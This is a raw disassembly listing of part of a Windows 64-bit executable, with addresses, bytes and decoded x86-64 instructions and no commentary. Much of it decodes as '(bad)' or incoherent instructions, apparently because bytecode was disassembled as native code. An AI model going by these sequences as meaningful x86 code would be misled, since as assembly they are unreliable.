   14000602b:	4c 0a 2b             	rex.WR or (%rbx),%r13b
   14000602e:	37                   	(bad)
   14000602f:	06                   	(bad)
   140006030:	08 4c 33 09          	or     %cl,0x9(%rbx,%rsi,1)
   140006034:	08 0a                	or     %cl,(%rdx)
   140006036:	02 06                	add    (%rsi),%al
   140006038:	28 67 00             	sub    %ah,0x0(%rdi)
   14000603b:	00 06                	add    %al,(%rsi)
   14000603d:	06                   	(bad)
   14000603e:	1e                   	(bad)
   14000603f:	6a 58                	push   $0x58
   140006041:	4c 1f                	rex.WR (bad)
   140006043:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140006046:	17                   	(bad)
   140006047:	52                   	push   %rdx
   140006048:	06                   	(bad)
   140006049:	1e                   	(bad)
   14000604a:	6a 58                	push   $0x58
   14000604c:	4c 1e                	rex.WR (bad)
   14000604e:	6a 58                	push   $0x58
   140006050:	4c 1f                	rex.WR (bad)
   140006052:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140006055:	16                   	(bad)
   140006056:	52                   	push   %rdx
   140006057:	02 06                	add    (%rsi),%al
   140006059:	1e                   	(bad)
   14000605a:	6a 58                	push   $0x58
   14000605c:	4c 1e                	rex.WR (bad)
   14000605e:	6a 58                	push   $0x58
   140006060:	4c 28 68 00          	rex.WR sub %r13b,0x0(%rax)
   140006064:	00 06                	add    %al,(%rsi)
   140006066:	06                   	(bad)
   140006067:	1e                   	(bad)
   140006068:	6a 58                	push   $0x58
   14000606a:	4c 1f                	rex.WR (bad)
   14000606c:	18 6a 58             	sbb    %ch,0x58(%rdx)
   14000606f:	46 39 fa             	rex.RX cmp %r15d,%edx
   140006072:	fe                   	(bad)
   140006073:	ff                   	(bad)
   140006074:	ff 07                	incl   (%rdi)
   140006076:	1e                   	(bad)
   140006077:	6a 58                	push   $0x58
   140006079:	4c 1f                	rex.WR (bad)
   14000607b:	18 6a 58             	sbb    %ch,0x58(%rdx)
   14000607e:	17                   	(bad)
   14000607f:	52                   	push   %rdx
   140006080:	04 2a                	add    $0x2a,%al
   140006082:	cc                   	int3
   140006083:	cc                   	int3
   140006084:	03 30                	add    (%rax),%esi
   140006086:	03 00                	add    (%rax),%eax
   140006088:	5b                   	pop    %rbx
   140006089:	00 00                	add    %al,(%rax)
   14000608b:	00 32                	add    %dh,(%rdx)
   14000608d:	00 00                	add    %al,(%rax)
   14000608f:	11 03                	adc    %eax,(%rbx)
   140006091:	1f                   	(bad)
   140006092:	10 6a 58             	adc    %ch,0x58(%rdx)
   140006095:	4c 0a 03             	rex.WR or (%rbx),%r8b
   140006098:	1f                   	(bad)
   140006099:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000609c:	06                   	(bad)
   14000609d:	4c 55                	rex.WR push %rbp
   14000609f:	06                   	(bad)
   1400060a0:	4c 0d 09 1f 19 6a    	rex.WR or $0x6a191f09,%rax
   1400060a6:	58                   	pop    %rax
   1400060a7:	46 2d 06 09 1e 6a    	rex.RX sub $0x6a1e0906,%eax
   1400060ad:	58                   	pop    %rax
   1400060ae:	03 55 06             	add    0x6(%rbp),%edx
   1400060b1:	1e                   	(bad)
   1400060b2:	6a 58                	push   $0x58
   1400060b4:	03 1e                	add    (%rsi),%ebx
   1400060b6:	6a 58                	push   $0x58
   1400060b8:	4c 55                	rex.WR push %rbp
   1400060ba:	02 4c 1e 6a          	add    0x6a(%rsi,%rbx,1),%cl
   1400060be:	58                   	pop    %rax
   1400060bf:	0c 03                	or     $0x3,%al
   1400060c1:	08 4c 33 05          	or     %cl,0x5(%rbx,%rsi,1)
   1400060c5:	08 06                	or     %al,(%rsi)
   1400060c7:	55                   	push   %rbp
   1400060c8:	2b 17                	sub    (%rdi),%edx
   1400060ca:	03 1e                	add    (%rsi),%ebx
   1400060cc:	6a 58                	push   $0x58
   1400060ce:	4c 0b 03             	or     (%rbx),%r8
   1400060d1:	07                   	(bad)
   1400060d2:	4c 33 05 07 06 55 2b 	xor    0x2b550607(%rip),%r8        # 0x16b5566e0
   1400060d9:	07                   	(bad)
   1400060da:	07                   	(bad)
   1400060db:	1f                   	(bad)
   1400060dc:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400060df:	06                   	(bad)
   1400060e0:	55                   	push   %rbp
   1400060e1:	06                   	(bad)
   1400060e2:	03 55 03             	add    0x3(%rbp),%edx
   1400060e5:	1e                   	(bad)
   1400060e6:	6a 58                	push   $0x58
   1400060e8:	06                   	(bad)
   1400060e9:	55                   	push   %rbp
   1400060ea:	2a cc                	sub    %ah,%cl
   1400060ec:	03 30                	add    (%rax),%esi
   1400060ee:	03 00                	add    (%rax),%eax
   1400060f0:	63 00                	movsxd (%rax),%eax
   1400060f2:	00 00                	add    %al,(%rax)
   1400060f4:	32 00                	xor    (%rax),%al
   1400060f6:	00 11                	add    %dl,(%rcx)
   1400060f8:	03 4c 0a 03          	add    0x3(%rdx,%rcx,1),%ecx
   1400060fc:	06                   	(bad)
   1400060fd:	1f                   	(bad)
   1400060fe:	10 6a 58             	adc    %ch,0x58(%rdx)
   140006101:	4c 55                	rex.WR push %rbp
   140006103:	06                   	(bad)
   140006104:	1f                   	(bad)
   140006105:	10 6a 58             	adc    %ch,0x58(%rdx)
   140006108:	4c 0d 09 1f 19 6a    	rex.WR or $0x6a191f09,%rax
   14000610e:	58                   	pop    %rax
   14000610f:	46 2d 06 09 1e 6a    	rex.RX sub $0x6a1e0906,%eax
   140006115:	58                   	pop    %rax
   140006116:	03 55 06             	add    0x6(%rbp),%edx
   140006119:	1e                   	(bad)
   14000611a:	6a 58                	push   $0x58
   14000611c:	03 1e                	add    (%rsi),%ebx
   14000611e:	6a 58                	push   $0x58
   140006120:	4c 55                	rex.WR push %rbp
   140006122:	02 4c 1e 6a          	add    0x6a(%rsi,%rbx,1),%cl
   140006126:	58                   	pop    %rax
   140006127:	0c 03                	or     $0x3,%al
   140006129:	08 4c 33 05          	or     %cl,0x5(%rbx,%rsi,1)
   14000612d:	08 06                	or     %al,(%rsi)
   14000612f:	55                   	push   %rbp
   140006130:	2b 1b                	sub    (%rbx),%ebx
   140006132:	03 1e                	add    (%rsi),%ebx
   140006134:	6a 58                	push   $0x58
   140006136:	4c 0b 03             	or     (%rbx),%r8
   140006139:	07                   	(bad)
   14000613a:	1f                   	(bad)
   14000613b:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000613e:	4c 33 09             	xor    (%rcx),%r9
   140006141:	07                   	(bad)
   140006142:	1f                   	(bad)
   140006143:	10 6a 58             	adc    %ch,0x58(%rdx)
   140006146:	06                   	(bad)
   140006147:	55                   	push   %rbp
   140006148:	2b 03                	sub    (%rbx),%eax
   14000614a:	07                   	(bad)
   14000614b:	06                   	(bad)
   14000614c:	55                   	push   %rbp
   14000614d:	06                   	(bad)
   14000614e:	1f                   	(bad)
   14000614f:	10 6a 58             	adc    %ch,0x58(%rdx)
   140006152:	03 55 03             	add    0x3(%rbp),%edx
   140006155:	1e                   	(bad)
   140006156:	6a 58                	push   $0x58
   140006158:	06                   	(bad)
   140006159:	55                   	push   %rbp
   14000615a:	2a cc                	sub    %ah,%cl
   14000615c:	03 30                	add    (%rax),%esi
   14000615e:	02 00                	add    (%rax),%al
   140006160:	60                   	(bad)
   140006161:	00 00                	add    %al,(%rax)
   140006163:	00 33                	add    %dh,(%rbx)
   140006165:	00 00                	add    %al,(%rax)
   140006167:	11 02                	adc    %eax,(%rdx)
   140006169:	4c 0c 08             	rex.WR or $0x8,%al
   14000616c:	1e                   	(bad)
   14000616d:	6a 58                	push   $0x58
   14000616f:	4c 0b 03             	or     (%rbx),%r8
   140006172:	07                   	(bad)
   140006173:	55                   	push   %rbp
   140006174:	03 1e                	add    (%rsi),%ebx
   140006176:	6a 58                	push   $0x58
   140006178:	16                   	(bad)
   140006179:	54                   	push   %rsp
   14000617a:	03 1f                	add    (%rdi),%ebx
   14000617c:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000617f:	08 55 07             	or     %dl,0x7(%rbp)
   140006182:	0a 06                	or     (%rsi),%al
   140006184:	1f                   	(bad)
   140006185:	19 6a 58             	sbb    %ebp,0x58(%rdx)
   140006188:	46 2d 3b 03 06 55    	rex.RX sub $0x5506033b,%eax
   14000618e:	06                   	(bad)
   14000618f:	1f                   	(bad)
   140006190:	20 6a 58             	and    %ch,0x58(%rdx)
   140006193:	04 28                	add    $0x28,%al
   140006195:	76 00                	jbe    0x140006197
   140006197:	00 06                	add    %al,(%rsi)
   140006199:	16                   	(bad)
   14000619a:	fe 04 d2             	incb   (%rdx,%rdx,8)
   14000619d:	2c 0f                	sub    $0xf,%al
   14000619f:	03 1e                	add    (%rsi),%ebx
   1400061a1:	6a 58                	push   $0x58
   1400061a3:	16                   	(bad)
   1400061a4:	54                   	push   %rsp
   1400061a5:	06                   	(bad)
   1400061a6:	1f                   	(bad)
   1400061a7:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400061aa:	4c 0a 2b             	rex.WR or (%rbx),%r13b
   1400061ad:	10 03                	adc    %al,(%rbx)
   1400061af:	1e                   	(bad)
   1400061b0:	6a 58                	push   $0x58
   1400061b2:	17                   	(bad)
   1400061b3:	54                   	push   %rsp
   1400061b4:	03 1f                	add    (%rdi),%ebx
   1400061b6:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400061b9:	06                   	(bad)
   1400061ba:	55                   	push   %rbp
   1400061bb:	06                   	(bad)
   1400061bc:	4c 0a 06             	rex.WR or (%rsi),%r8b
   1400061bf:	1f                   	(bad)
   1400061c0:	19 6a 58             	sbb    %ebp,0x58(%rdx)
   1400061c3:	46 2c c5             	rex.RX sub $0xc5,%al
   1400061c6:	03 2a                	add    (%rdx),%ebp
   1400061c8:	03 30                	add    (%rax),%esi
   1400061ca:	03 00                	add    (%rax),%eax
   1400061cc:	49 00 00             	rex.WB add %al,(%r8)
   1400061cf:	00 34 00             	add    %dh,(%rax,%rax,1)
   1400061d2:	00 11                	add    %dl,(%rcx)
   1400061d4:	03 1f                	add    (%rdi),%ebx
   1400061d6:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400061d9:	4c 0c 03             	rex.WR or $0x3,%al
   1400061dc:	28 3b                	sub    %bh,(%rbx)
   1400061de:	00 00                	add    %al,(%rax)
   1400061e0:	06                   	(bad)
   1400061e1:	13 05 02 1f 10 6a    	adc    0x6a101f02(%rip),%eax        # 0x1aa1080e9
   1400061e7:	58                   	pop    %rax
   1400061e8:	4c 0b 02             	or     (%rdx),%r8
   1400061eb:	28 3b                	sub    %bh,(%rbx)
   1400061ed:	00 00                	add    %al,(%rax)
   1400061ef:	06                   	(bad)
   1400061f0:	08 07                	or     %al,(%rdi)
   1400061f2:	37                   	(bad)
   1400061f3:	04 12                	add    $0x12,%al
   1400061f5:	01 2b                	add    %ebp,(%rbx)
   1400061f7:	02 12                	add    (%rdx),%dl
   1400061f9:	02 13                	add    (%rbx),%dl
   1400061fb:	04 11                	add    $0x11,%al
   1400061fd:	05 11 04 4c 28       	add    $0x284c0411,%eax
   140006202:	7c 00                	jl     0x140006204
   140006204:	00 06                	add    %al,(%rsi)
   140006206:	0d 09 2c 04 09       	or     $0x9042c09,%eax
   14000620b:	0a 2b                	or     (%rbx),%ch
   14000620d:	0d 07 08 34 04       	or     $0x4340807,%eax
   140006212:	15 0a 2b 05 07       	adc    $0x7052b0a,%eax
   140006217:	08 fe                	or     %bh,%dh
   140006219:	03 0a                	add    (%rdx),%ecx
   14000621b:	06                   	(bad)
   14000621c:	2a cc                	sub    %ah,%cl
   14000621e:	cc                   	int3
   14000621f:	cc                   	int3
   140006220:	03 30                	add    (%rax),%esi
   140006222:	03 00                	add    (%rax),%eax
   140006224:	36 00 00             	ss add %al,(%rax)
   140006227:	00 35 00 00 11 04    	add    %dh,0x4110000(%rip)        # 0x14411622d
   14000622d:	0c 03                	or     $0x3,%al
   14000622f:	0b 02                	or     (%rdx),%eax
   140006231:	0a 16                	or     (%rsi),%dl
   140006233:	6a 04                	push   $0x4
   140006235:	34 27                	xor    $0x27,%al
   140006237:	06                   	(bad)
   140006238:	49 07                	rex.WB (bad)
   14000623a:	49 33 16             	xor    (%r14),%rdx
   14000623d:	06                   	(bad)
   14000623e:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140006241:	0a 07                	or     (%rdi),%al
   140006243:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140006246:	0b 08                	or     (%rax),%ecx
   140006248:	17                   	(bad)
   140006249:	6a 59                	push   $0x59
   14000624b:	0c 16                	or     $0x16,%al
   14000624d:	6a 08                	push   $0x8
   14000624f:	37                   	(bad)
   140006250:	e6 2b                	out    %al,$0x2b
   140006252:	0b 15 06 49 07 49    	or     0x49074906(%rip),%edx        # 0x18907ab5e
   140006258:	37                   	(bad)
   140006259:	01 65 0d             	add    %esp,0xd(%rbp)
   14000625c:	2b 02                	sub    (%rdx),%eax
   14000625e:	16                   	(bad)
   14000625f:	0d 09 2a cc cc       	or     $0xcccc2a09,%eax
   140006264:	03 30                	add    (%rax),%esi
   140006266:	03 00                	add    (%rax),%eax
   140006268:	22 00                	and    (%rax),%al
   14000626a:	00 00                	add    %al,(%rax)
   14000626c:	36 00 00             	ss add %al,(%rax)
   14000626f:	11 03                	adc    %eax,(%rbx)
   140006271:	1f                   	(bad)
   140006272:	19 6a 58             	sbb    %ebp,0x58(%rdx)
   140006275:	46 2d 15 04 03 1f    	rex.RX sub $0x1f030415,%eax
   14000627b:	20 6a 58             	and    %ch,0x58(%rdx)
   14000627e:	28 76 00             	sub    %dh,0x0(%rsi)
   140006281:	00 06                	add    %al,(%rsi)
   140006283:	16                   	(bad)
   140006284:	fe 04 d2             	incb   (%rdx,%rdx,8)
   140006287:	2d 04 17 0a 2b       	sub    $0x2b0a1704,%eax
   14000628c:	02 16                	add    (%rsi),%dl
   14000628e:	0a 06                	or     (%rsi),%al
   140006290:	d2 2a                	shrb   %cl,(%rdx)
   140006292:	cc                   	int3
   140006293:	cc                   	int3
   140006294:	0b 30                	or     (%rax),%esi
   140006296:	02 00                	add    (%rax),%al
   140006298:	2b 00                	sub    (%rax),%eax
   14000629a:	00 00                	add    %al,(%rax)
   14000629c:	18 00                	sbb    %al,(%rax)
   14000629e:	00 11                	add    %dl,(%rcx)
   1400062a0:	02 1e                	add    (%rsi),%bl
   1400062a2:	6a 58                	push   $0x58
   1400062a4:	4c 0a 06             	rex.WR or (%rsi),%r8b
   1400062a7:	2c 0c                	sub    $0xc,%al
   1400062a9:	06                   	(bad)
   1400062aa:	1f                   	(bad)
   1400062ab:	20 6a 58             	and    %ch,0x58(%rdx)
   1400062ae:	16                   	(bad)
   1400062af:	28 6e 00             	sub    %ch,0x0(%rsi)
   1400062b2:	00 06                	add    %al,(%rsi)
   1400062b4:	26 de 0d fe 06 53 00 	es fimuls 0x5306fe(%rip)        # 0x1405369b9
   1400062bb:	00 06                	add    %al,(%rsi)
   1400062bd:	02 28                	add    (%rax),%ch
   1400062bf:	7d 00                	jge    0x1400062c1
   1400062c1:	00 06                	add    %al,(%rsi)
   1400062c3:	dc 02                	faddl  (%rdx)
   1400062c5:	28 5d 00             	sub    %bl,0x0(%rbp)
   1400062c8:	00 06                	add    %al,(%rsi)
   1400062ca:	2a 00                	sub    (%rax),%al
   1400062cc:	41 1c 00             	rex.B sbb $0x0,%al
   1400062cf:	00 04 00             	add    %al,(%rax,%rax,1)
   1400062d2:	00 00                	add    %al,(%rax)
   1400062d4:	00 00                	add    %al,(%rax)
   1400062d6:	00 00                	add    %al,(%rax)
   1400062d8:	17                   	(bad)
   1400062d9:	00 00                	add    %al,(%rax)
   1400062db:	00 17                	add    %dl,(%rdi)
   1400062dd:	00 00                	add    %al,(%rax)
   1400062df:	00 0d 00 00 00 3b    	add    %cl,0x3b000000(%rip)        # 0x17b0062e5
   1400062e5:	00 00                	add    %al,(%rax)
   1400062e7:	01 03                	add    %eax,(%rbx)
   1400062e9:	30 01                	xor    %al,(%rcx)
   1400062eb:	00 07                	add    %al,(%rdi)
   1400062ed:	00 00                	add    %al,(%rax)
   1400062ef:	00 00                	add    %al,(%rax)
   1400062f1:	00 00                	add    %al,(%rax)
   1400062f3:	00 02                	add    %al,(%rdx)
   1400062f5:	28 5d 00             	sub    %bl,0x0(%rbp)
   1400062f8:	00 06                	add    %al,(%rsi)
   1400062fa:	2a 00                	sub    (%rax),%al
   1400062fc:	03 30                	add    (%rax),%esi
   1400062fe:	02 00                	add    (%rax),%al
   140006300:	17                   	(bad)
   140006301:	00 00                	add    %al,(%rax)
   140006303:	00 37                	add    %dh,(%rdi)
   140006305:	00 00                	add    %al,(%rax)
   140006307:	11 02                	adc    %eax,(%rdx)
   140006309:	1e                   	(bad)
   14000630a:	6a 58                	push   $0x58
   14000630c:	4c 0a 06             	rex.WR or (%rsi),%r8b
   14000630f:	2c 0d                	sub    $0xd,%al
   140006311:	1f                   	(bad)
   140006312:	58                   	pop    %rax
   140006313:	6a 0b                	push   $0xb
   140006315:	06                   	(bad)
   140006316:	1f                   	(bad)
   140006317:	58                   	pop    %rax
   140006318:	6a 28                	push   $0x28
   14000631a:	da 00                	fiaddl (%rax)
   14000631c:	00 06                	add    %al,(%rsi)
   14000631e:	2a 00                	sub    (%rax),%al
   140006320:	0b 30                	or     (%rax),%esi
   140006322:	05 00 68 00 00       	add    $0x6800,%eax
   140006327:	00 38                	add    %bh,(%rax)
   140006329:	00 00                	add    %al,(%rax)
   14000632b:	11 02                	adc    %eax,(%rdx)
   14000632d:	03 55 02             	add    0x2(%rbp),%edx
   140006330:	1e                   	(bad)
   140006331:	6a 58                	push   $0x58
   140006333:	0a 06                	or     (%rsi),%al
   140006335:	16                   	(bad)
   140006336:	6a 55                	push   $0x55
   140006338:	02 28                	add    (%rax),%ch
   14000633a:	73 00                	jae    0x14000633c
   14000633c:	00 06                	add    %al,(%rsi)
   14000633e:	de 0d fe 06 5d 00    	fimuls 0x5d06fe(%rip)        # 0x1405d6a42
   140006344:	00 06                	add    %al,(%rsi)
   140006346:	02 28                	add    (%rax),%ch
   140006348:	7d 00                	jge    0x14000634a
   14000634a:	00 06                	add    %al,(%rsi)
   14000634c:	dc 00                	faddl  (%rax)
   14000634e:	02 4c 06 4c          	add    0x4c(%rsi,%rax,1),%cl
   140006352:	1f                   	(bad)
   140006353:	20 6a 58             	and    %ch,0x58(%rdx)
   140006356:	05 0e 04 0e 05       	add    $0x50e040e,%eax
   14000635b:	28 58 00             	sub    %bl,0x0(%rax)
   14000635e:	00 06                	add    %al,(%rsi)
   140006360:	06                   	(bad)
   140006361:	4c 04 55             	rex.WR add $0x55,%al
   140006364:	06                   	(bad)
   140006365:	4c 1e                	rex.WR (bad)
   140006367:	6a 58                	push   $0x58
   140006369:	04 55                	add    $0x55,%al
   14000636b:	06                   	(bad)
   14000636c:	4c 1f                	rex.WR (bad)
   14000636e:	10 6a 58             	adc    %ch,0x58(%rdx)
   140006371:	04 55                	add    $0x55,%al
   140006373:	06                   	(bad)
   140006374:	4c 1f                	rex.WR (bad)
   140006376:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140006379:	16                   	(bad)
   14000637a:	52                   	push   %rdx
   14000637b:	06                   	(bad)
   14000637c:	4c 1f                	rex.WR (bad)
   14000637e:	19 6a 58             	sbb    %ebp,0x58(%rdx)
   140006381:	16                   	(bad)
   140006382:	52                   	push   %rdx
   140006383:	de 0d fe 06 53 00    	fimuls 0x5306fe(%rip)        # 0x140536a87
   140006389:	00 06                	add    %al,(%rsi)
   14000638b:	02 28                	add    (%rax),%ch
   14000638d:	7d 00                	jge    0x14000638f
   14000638f:	00 06                	add    %al,(%rsi)
   140006391:	dc 02                	faddl  (%rdx)
   140006393:	2a 41 34             	sub    0x34(%rcx),%al
   140006396:	00 00                	add    %al,(%rax)
   140006398:	04 00                	add    $0x0,%al
   14000639a:	00 00                	add    %al,(%rax)
   14000639c:	0c 00                	or     $0x0,%al
   14000639e:	00 00                	add    %al,(%rax)
   1400063a0:	08 00                	or     %al,(%rax)
   1400063a2:	00 00                	add    %al,(%rax)
   1400063a4:	14 00                	adc    $0x0,%al
   1400063a6:	00 00                	add    %al,(%rax)
   1400063a8:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   1400063ad:	00 00                	add    %al,(%rax)
   1400063af:	01 04 00             	add    %eax,(%rax,%rax,1)
   1400063b2:	00 00                	add    %al,(%rax)
   1400063b4:	22 00                	and    (%rax),%al
   1400063b6:	00 00                	add    %al,(%rax)
   1400063b8:	37                   	(bad)
   1400063b9:	00 00                	add    %al,(%rax)
   1400063bb:	00 59 00             	add    %bl,0x0(%rcx)
   1400063be:	00 00                	add    %al,(%rax)
   1400063c0:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   1400063c5:	00 00                	add    %al,(%rax)
   1400063c7:	01 03                	add    %eax,(%rbx)
   1400063c9:	30 02                	xor    %al,(%rdx)
   1400063cb:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 0x1400063d1
   1400063d1:	00 00                	add    %al,(%rax)
   1400063d3:	00 02                	add    %al,(%rdx)
   1400063d5:	1e                   	(bad)
   1400063d6:	6a 58                	push   $0x58
   1400063d8:	16                   	(bad)
   1400063d9:	6a 55                	push   $0x55
   1400063db:	02 1e                	add    (%rsi),%bl
   1400063dd:	6a 58                	push   $0x58
   1400063df:	1f                   	(bad)
   1400063e0:	58                   	pop    %rax
   1400063e1:	6a 28                	push   $0x28
   1400063e3:	74 00                	je     0x1400063e5
   1400063e5:	00 06                	add    %al,(%rsi)
   1400063e7:	55                   	push   %rbp
   1400063e8:	2a cc                	sub    %ah,%cl
   1400063ea:	cc                   	int3
   1400063eb:	cc                   	int3
   1400063ec:	03 30                	add    (%rax),%esi
   1400063ee:	04 00                	add    $0x0,%al
   1400063f0:	18 00                	sbb    %al,(%rax)
   1400063f2:	00 00                	add    %al,(%rax)
   1400063f4:	39 00                	cmp    %eax,(%rax)
   1400063f6:	00 11                	add    %dl,(%rcx)
   1400063f8:	12 01                	adc    (%rcx),%al
   1400063fa:	05 1e fe 17 03       	add    $0x317fe1e,%eax
   1400063ff:	04 71                	add    $0x71,%al
   140006401:	1e                   	(bad)
   140006402:	00 00                	add    %al,(%rax)
   140006404:	02 12                	add    (%rdx),%dl
   140006406:	01 12                	add    %edx,(%rdx)
   140006408:	00 28                	add    %ch,(%rax)
   14000640a:	70 00                	jo     0x14000640c
   14000640c:	00 06                	add    %al,(%rsi)
   14000640e:	26 2a 0b             	es sub (%rbx),%cl
   140006411:	30 02                	xor    %al,(%rdx)
   140006413:	00 25 00 00 00 00    	add    %ah,0x0(%rip)        # 0x140006419
   140006419:	00 00                	add    %al,(%rax)
   14000641b:	00 02                	add    %al,(%rdx)
   14000641d:	04 4c                	add    $0x4c,%al
   14000641f:	28 7a 00             	sub    %bh,0x0(%rdx)
   140006422:	00 06                	add    %al,(%rsi)
   140006424:	26 02 1f             	es add (%rdi),%bl
   140006427:	20 6a 58             	and    %ch,0x58(%rdx)
   14000642a:	28 79 00             	sub    %bh,0x0(%rcx)
   14000642d:	00 06                	add    %al,(%rsi)
   14000642f:	26 de 0d fe 06 2b 00 	es fimuls 0x2b06fe(%rip)        # 0x1402b6b34
   140006436:	00 06                	add    %al,(%rsi)
   140006438:	02 28                	add    (%rax),%ch
   14000643a:	7d 00                	jge    0x14000643c
   14000643c:	00 06                	add    %al,(%rsi)
   14000643e:	dc 02                	faddl  (%rdx)
   140006440:	2a 00                	sub    (%rax),%al
   140006442:	00 00                	add    %al,(%rax)
   140006444:	41 1c 00             	rex.B sbb $0x0,%al
   140006447:	00 04 00             	add    %al,(%rax,%rax,1)
   14000644a:	00 00                	add    %al,(%rax)
   14000644c:	09 00                	or     %eax,(%rax)
   14000644e:	00 00                	add    %al,(%rax)
   140006450:	0d 00 00 00 16       	or     $0x16000000,%eax
   140006455:	00 00                	add    %al,(%rax)
   140006457:	00 0d 00 00 00 3b    	add    %cl,0x3b000000(%rip)        # 0x17b00645d
   14000645d:	00 00                	add    %al,(%rax)
   14000645f:	01 03                	add    %eax,(%rbx)
   140006461:	30 03                	xor    %al,(%rbx)
   140006463:	00 63 01             	add    %ah,0x1(%rbx)
   140006466:	00 00                	add    %al,(%rax)
   140006468:	3a 00                	cmp    (%rax),%al
   14000646a:	00 11                	add    %dl,(%rcx)
   14000646c:	03 28                	add    (%rax),%ebp
   14000646e:	3b 00                	cmp    (%rax),%eax
   140006470:	00 06                	add    %al,(%rsi)
   140006472:	28 14 00             	sub    %dl,(%rax,%rax,1)
   140006475:	00 06                	add    %al,(%rsi)
   140006477:	0c 12                	or     $0x12,%al
   140006479:	04 7f                	add    $0x7f,%al
   14000647b:	05 00 00 04 55       	add    $0x55040000,%eax
   140006480:	12 04 1e             	adc    (%rsi,%rbx,1),%al
   140006483:	58                   	pop    %rax
   140006484:	7f 06                	jg     0x14000648c
   140006486:	00 00                	add    %al,(%rax)
   140006488:	04 55                	add    $0x55,%al
   14000648a:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000648d:	10 58 7f             	adc    %bl,0x7f(%rax)
   140006490:	07                   	(bad)
   140006491:	00 00                	add    %al,(%rax)
   140006493:	04 55                	add    $0x55,%al
   140006495:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140006498:	18 58 7f             	sbb    %bl,0x7f(%rax)
   14000649b:	08 00                	or     %al,(%rax)
   14000649d:	00 04 55 12 04 1f 20 	add    %al,0x201f0412(,%rdx,2)
   1400064a4:	58                   	pop    %rax
   1400064a5:	7f 09                	jg     0x1400064b0
   1400064a7:	00 00                	add    %al,(%rax)
   1400064a9:	04 55                	add    $0x55,%al
   1400064ab:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400064ae:	28 58 7f             	sub    %bl,0x7f(%rax)
   1400064b1:	0a 00                	or     (%rax),%al
   1400064b3:	00 04 55 12 04 1f 30 	add    %al,0x301f0412(,%rdx,2)
   1400064ba:	58                   	pop    %rax
   1400064bb:	7f 0b                	jg     0x1400064c8
   1400064bd:	00 00                	add    %al,(%rax)
   1400064bf:	04 55                	add    $0x55,%al
   1400064c1:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400064c4:	38 58 7f             	cmp    %bl,0x7f(%rax)
   1400064c7:	0c 00                	or     $0x0,%al
   1400064c9:	00 04 55 12 04 1f 40 	add    %al,0x401f0412(,%rdx,2)
   1400064d0:	58                   	pop    %rax
   1400064d1:	7f 0d                	jg     0x1400064e0
   1400064d3:	00 00                	add    %al,(%rax)
   1400064d5:	04 55                	add    $0x55,%al
   1400064d7:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400064da:	48 58                	rex.W pop %rax
   1400064dc:	7f 0e                	jg     0x1400064ec
   1400064de:	00 00                	add    %al,(%rax)
   1400064e0:	04 55                	add    $0x55,%al
   1400064e2:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400064e5:	50                   	push   %rax
   1400064e6:	58                   	pop    %rax
   1400064e7:	7f 0f                	jg     0x1400064f8
   1400064e9:	00 00                	add    %al,(%rax)
   1400064eb:	04 55                	add    $0x55,%al
   1400064ed:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400064f0:	58                   	pop    %rax
   1400064f1:	58                   	pop    %rax
   1400064f2:	7f 10                	jg     0x140006504
   1400064f4:	00 00                	add    %al,(%rax)
   1400064f6:	04 55                	add    $0x55,%al
   1400064f8:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   1400064fb:	60                   	(bad)
   1400064fc:	58                   	pop    %rax
   1400064fd:	7f 11                	jg     0x140006510
   1400064ff:	00 00                	add    %al,(%rax)
   140006501:	04 55                	add    $0x55,%al
   140006503:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   140006506:	68 58 7f 12 00       	push   $0x127f58
   14000650b:	00 04 55 12 04 1f 70 	add    %al,0x701f0412(,%rdx,2)
   140006512:	58                   	pop    %rax
   140006513:	7f 13                	jg     0x140006528
   140006515:	00 00                	add    %al,(%rax)
   140006517:	04 55                	add    $0x55,%al
   140006519:	12 04 1f             	adc    (%rdi,%rbx,1),%al
   14000651c:	78 58                	js     0x140006576
   14000651e:	7f 14                	jg     0x140006534
   140006520:	00 00                	add    %al,(%rax)
   140006522:	04 55                	add    $0x55,%al
   140006524:	12 04 20             	adc    (%rax,%riz,1),%al
   140006527:	80 00 00             	addb   $0x0,(%rax)
   14000652a:	00 58 7f             	add    %bl,0x7f(%rax)
   14000652d:	15 00 00 04 55       	adc    $0x55040000,%eax
   140006532:	12 04 20             	adc    (%rax,%riz,1),%al
   140006535:	88 00                	mov    %al,(%rax)
   140006537:	00 00                	add    %al,(%rax)
   140006539:	58                   	pop    %rax
   14000653a:	7f 16                	jg     0x140006552
   14000653c:	00 00                	add    %al,(%rax)
   14000653e:	04 55                	add    $0x55,%al
   140006540:	12 04 20             	adc    (%rax,%riz,1),%al
   140006543:	90                   	nop
   140006544:	00 00                	add    %al,(%rax)
   140006546:	00 58 7f             	add    %bl,0x7f(%rax)
   140006549:	17                   	(bad)
   14000654a:	00 00                	add    %al,(%rax)
   14000654c:	04 55                	add    $0x55,%al
   14000654e:	12 04 20             	adc    (%rax,%riz,1),%al
   140006551:	98                   	cwtl
   140006552:	00 00                	add    %al,(%rax)
   140006554:	00 58 7f             	add    %bl,0x7f(%rax)
   140006557:	18 00                	sbb    %al,(%rax)
   140006559:	00 04 55 12 04 20 a0 	add    %al,-0x5fdffbee(,%rdx,2)
   140006560:	00 00                	add    %al,(%rax)
   140006562:	00 58 7f             	add    %bl,0x7f(%rax)
   140006565:	19 00                	sbb    %eax,(%rax)
   140006567:	00 04 55 12 04 20 a8 	add    %al,-0x57dffbee(,%rdx,2)
   14000656e:	00 00                	add    %al,(%rax)
